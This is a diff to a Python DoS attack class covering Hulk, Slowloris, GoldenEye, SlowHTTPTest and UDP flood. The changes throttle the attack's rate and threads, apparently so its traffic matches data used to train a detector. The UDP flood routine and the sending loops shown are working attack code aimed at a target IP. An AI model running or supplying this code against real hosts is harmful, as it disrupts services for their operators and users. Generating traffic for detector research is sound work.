@@ -160,8 +160,8 @@ class DoSAttack:
             except Exception:
                 pass
 
-            # VARIATION: Variable delay — more realistic attack pattern
-            time.sleep(random.uniform(0.005, 0.05))
+            # THROTTLED: Increased delay for realistic rate (~3-5 flows per 60 sec from HTTP)
+            time.sleep(random.uniform(2.0, 3.0))  # Was 0.005-0.05 (too aggressive)
 
     # ──────────────────────────────────────────────────────
     # SLOWLORIS — Hold connections open with incomplete headers
@@ -323,8 +323,8 @@ class DoSAttack:
             except Exception:
                 pass
 
-            # VARIATION: Variable delay for realistic spacing
-            time.sleep(random.uniform(0.01, 0.1))
+            # THROTTLED: Variable delay for realistic spacing (2-3 sec matches training)
+            time.sleep(random.uniform(2.0, 3.0))
 
     # ──────────────────────────────────────────────────────
     # SlowHTTPTest — Slow POST body transmission
@@ -386,38 +386,46 @@ class DoSAttack:
 
     # ──────────────────────────────────────────────────────
     # UDP FLOOD — Protocol diversity (not just TCP)
-    #   Sends random UDP packets to various ports.
-    #   Creates flows with protocol=17 (UDP), variable sizes.
+    #   FIXED: Reuse socket for multiple packets (fewer flows = realistic)
+    #   Send 2-3 packets per flow, then rotate to new destination port/size
+    #   Target: 3-5 flows/sec (not 100+)
     # ──────────────────────────────────────────────────────
     def udp_flood(self):
-        """UDP Flood: Send random UDP packets to various ports.
-        Adds protocol diversity to the attack traffic (not just TCP/80)."""
+        """UDP Flood: Send bursts of UDP packets, reusing socket per burst.
+        Creates fewer, more realistic flows. ~3-5 flows/sec."""
         end_time = time.time() + self.duration
         udp_ports = [53, 123, 161, 162, 514, 1900, 5353, 19132, 27015]
         
         while self.running and time.time() < end_time:
             try:
+                # Create ONE socket for a burst
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 sock.settimeout(3)
                 
-                # VARIATION: Random UDP port and payload size
+                # Choose random destination port and payload size for this burst
                 attack_port = random.choice(udp_ports)
-                payload_size = random.randint(10, 1500)
+                payload_size = random.randint(64, 512)  # Reduced from 10-1500
                 payload = _random_string(payload_size)
                 
-                sock.sendto(payload.encode(), (self.target_ip, attack_port))
-                self._inc_count()
+                # Send 2-3 packets per burst (same flow)
+                burst_packets = random.randint(2, 3)
+                for _ in range(burst_packets):
+                    sock.sendto(payload.encode(), (self.target_ip, attack_port))
+                    self._inc_count()
+                
                 sock.close()
+                
             except Exception:
                 pass
             
-            # Variable inter-packet timing
-            time.sleep(random.uniform(0.001, 0.05))
+            # Sleep 0.3-0.5 sec between bursts = ~2-3 UDP flows/sec
+            time.sleep(random.uniform(0.3, 0.5))
 
-    def run_attack(self, num_threads=5):
-        """Run DoS attack with multiple threads across all techniques."""
+    def run_attack(self, num_threads=1):
+        """Run DoS attack with 1 thread (reduced from 5).
+        Target: 3-5 flows/sec total."""
         print(f"[DoS] Starting attack on {self.target_ip}:{self.target_port} for {self.duration}s")
-        print(f"[DoS] Techniques: Hulk + Slowloris + GoldenEye + SlowHTTPTest + UDP Flood")
+        print(f"[DoS] Techniques: Hulk + Slowloris + GoldenEye + SlowHTTPTest + UDP Flood (throttled)")
         print(f"[DoS] Using {num_threads} threads")
 
         techniques = [
